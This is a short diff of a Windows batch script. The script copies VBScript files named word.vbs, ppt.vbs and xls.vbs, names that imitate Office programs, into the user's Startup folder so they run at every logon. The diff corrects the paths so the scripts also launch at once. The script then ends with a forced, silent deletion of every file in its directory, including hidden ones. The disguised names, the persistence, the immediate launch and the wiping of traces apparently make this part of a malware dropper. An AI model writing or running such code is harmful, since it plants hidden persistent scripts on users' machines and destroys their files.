@@ -74,7 +74,7 @@ echo.
 copy "word.vbs" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 copy "ppt.vbs" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 copy "xls.vbs" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\word.vbs"
-start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ppt.vbs"
-start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\xls.vbs"
+start "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\word.vbs"
+start "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ppt.vbs"
+start "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xls.vbs"
 del /a /f /q *
